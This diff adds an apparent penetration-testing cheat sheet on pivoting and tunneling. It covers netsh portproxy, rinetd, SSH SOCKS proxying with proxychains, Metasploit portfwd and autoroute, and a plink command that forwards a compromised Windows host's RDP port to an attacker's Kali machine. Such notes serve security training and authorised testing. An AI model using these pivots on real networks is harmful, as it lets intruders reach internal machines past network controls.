@@ -1,0 +1,62 @@
+SSH Tunneling
+
+-------------------------
+netsh	
+netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport 
+
+-------------------------
+SOCKS proxy 1	
+
+# if you have access to a Windows server with ports 80,443 allowed, use a proxy server with public IP address to reach 
+to a machine's 3389 port in the same network
+	
+# on kali, add the following line in /etc/rinetd.conf file
+<kali IP> <port 80 or 443> <windows server IP> <port to connect> 
+	
+# restart the service
+/etc/init.d/rinetd restart
+	
+# connect to the target machine with RDP by using Kali IP and port 80 or 443
+
+-------------------------
+SOCKS proxy 2	
+
+# if you have a shell on DMZ server (ssh, apache working), run following on Kali
+ssh -D 8080 root@admin.megacorpone.com 
+	
+# check on Kali if you listen port 8080
+netstat -antp | grep 8080
+	
+# set socks4 on /etc/proxychains.conf file 
+socks4 127.0.0.1 8080
+	
+# run commands starting with proxychains
+
+-------------------------
+Local Port Forwarding	
+# check if port 3389 is listening
+C:\> netstat -an | find “LISTEN” 
+	
+# send the traffic of Windows from 3389 to 3390 of attacker (kali)
+C:\> plink -l root -pw kalisshpasswd <kali IP> -R 3390:127.0.0.1:3389 
+	
+# on Kali, start rdp to get port 3389 of windows
+# rdesktop 127.0.0.1:3390 
+
+-------------------------
+Metasploit	
+
+meterpreter> portfwd list 
+portfwd add –l 3389 –p 3389 –r target-host 
+portfwd delete –l 3389 –p 3389 –r target-host 
+portfwd flush 
+
+-------------------------
+Metasploit 2 	
+
+run autoroute -s 192.168.15.0/24 
+use auxiliary/server/socks4a 
+run autoroute -p 
+route add 192.168.14.0 255.255.255.0 3 
+route delete 192.168.14.0 255.255.255.0 3 
+route flush 
